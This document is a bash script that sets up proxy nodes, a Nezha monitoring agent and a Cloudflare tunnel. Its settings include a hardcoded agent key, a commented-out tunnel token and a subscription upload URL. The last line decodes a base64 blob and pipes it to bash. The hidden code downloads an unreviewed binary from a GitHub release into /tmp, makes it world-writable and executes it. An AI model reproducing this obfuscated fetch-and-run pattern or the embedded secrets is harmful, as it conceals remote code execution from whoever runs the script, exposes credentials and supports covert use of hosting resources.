#!/bin/bash
# 哪吒相关设置
export NSERVER=${NSERVER:-'v1.xuexi365.eu.org:443'}
export NKEY=${NKEY:-'KL6Nu7RSxyiGTUFUM8OxS5PIBqxdeiiz'}
# export AGENT_UUID=${AGENT_UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}  # 指定哪吒v1的uuid，默认随机

# 隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
# export TOK=${TOK:-'eyJhIjoiNTRhM2QyMDEwZTk0YmU5MDA3NWQxZmI0NGQ4ZTg2YWEiLCJ0IjoiMzEzZmEyZTEtOWNhNi00MjQwLWE5MDMtNjUzYzEwMGM1ZGM2IiwicyI6IlpHVTRZVEpqWkRJdFl6RmpOQzAwWkRrMkxXSTVPVEV0T0dNM1lqTmtZbVV3TWpZdyJ9'} 
# export DOM=${DOM:-'codered.tiktok.lookin.at'} 

# Telegram配置 - 格式: "CHAT_ID BOT_TOKEN"
export TG=${TG:-''}
#export TUNNEL_PROXY="1"

#export TUNNEL_PROXY=socks5://用户名:密码@ip:端口
# 节点相关设置
export XIEYI=${XIEYI:-'vms'}  # 节点类型,可选vls,vms,rel
export VL_PORT=${VL_PORT:-'8002'}   # vles 端口
export VM_PORT=${VM_PORT:-'8001'} # vmes 端口
export SUB_NAME=${SUB_NAME:-'weirdhost.xyz'} # 节点名称
export SUB_URL='https://sub-all.xtu.workers.dev/upload-3e9126ae-5492-471b-9a91-11a4dbd640c2'

export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}" # 端口
export SNI=${SNI:-'www.apple.com'} # tls网站

# 游戏相关设置(去掉#开启游戏，复制启动命令填在下面)
# export JAR_SH='moni'  # 启动命令，文件名称改为senver.jar

# 随机文件名
generate_random_string() {
    echo "$(tr -dc a-z </dev/urandom | head -c 1)$(tr -dc a-z0-9 </dev/urandom | head -c 4)"
}
ne_file_default="nez$(generate_random_string)"
cff_file_default="cff$(generate_random_string)"
web_file_default="web$(generate_random_string)"
export ne_file=${ne_file:-$ne_file_default} 
export cff_file=${cff_file:-$cff_file_default} 
export web_file=${web_file:-$web_file_default} 

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash